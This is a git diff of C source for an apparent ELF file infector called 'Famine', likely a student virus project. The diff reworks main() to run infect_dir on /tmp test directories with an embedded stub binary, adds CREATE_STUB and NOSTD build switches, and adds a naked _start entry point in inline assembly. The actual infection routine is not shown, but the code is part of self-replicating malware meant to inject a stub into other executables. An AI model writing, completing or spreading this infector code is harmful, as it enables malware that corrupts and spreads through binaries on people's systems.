@@ -12,17 +12,39 @@
 
 #include "../include/famine.h"
 
+#if CREATE_STUB
+
 int main(void) {
-	infect_dir("/tmp/test");
-	infect_dir("/tmp/test2");
+	// FIXME: should get the stub from the executable itself,
+	//        we will need to add some variables which locate the placeholders
+	//        instead of searching through the text
+	infect_dir("/tmp/test", stub_bin, stub_bin_len);
+	infect_dir("/tmp/test2", stub_bin, stub_bin_len);
+	sys_write(STDOUT_FILENO, "done\n", 5);
 	return (0);
 }
 
-#ifndef CREATE_STUB
-#define CREATE_STUB 1
+#else
+
+int main(void) {
+	infect_dir("/tmp/test", stub_bin, stub_bin_len);
+	infect_dir("/tmp/test2", stub_bin, stub_bin_len);
+	sys_write(STDOUT_FILENO, "done\n", 5);
+	return (0);
+}
+
+#endif // CREATE_STUB
+
+// #define NOSTD 1
+// #define CREATE_STUB 1
+#if CREATE_STUB
+#if NOSTD
+#else
+#error Creating a stub requires NOSTD
+#endif
 #endif
 
-#if CREATE_STUB
+#if NOSTD
 
 __attribute__((section(".signature")))
 __attribute__((used))
@@ -55,6 +77,8 @@ size_t my_start(size_t *rsp) {
 	return load_base;
 }
 
+#if CREATE_STUB
+
 __attribute__((section("._start")))
 __attribute__((naked))
 void _start() {
@@ -72,4 +96,22 @@ void _start() {
 	);
 }
 
-#endif
+#else
+
+__attribute__((section("._start")))
+__attribute__((naked))
+void _start() {
+	// callee-saved RBX, RSP, RBP, and R12–R15
+	asm volatile(
+		"movq %%rdx, %%rbx\n" // save rtld_fini
+		"leaq (%%rsp), %%rdi\n" // pass address of rsp to my_start
+		"call my_start\n"
+		"xorq %%rdi, %%rdi\n"
+		"movq $60, %%rax\n"
+		"syscall\n"
+		:
+	);
+}
+
+#endif // CREATE_STUB
+#endif // NOSTD
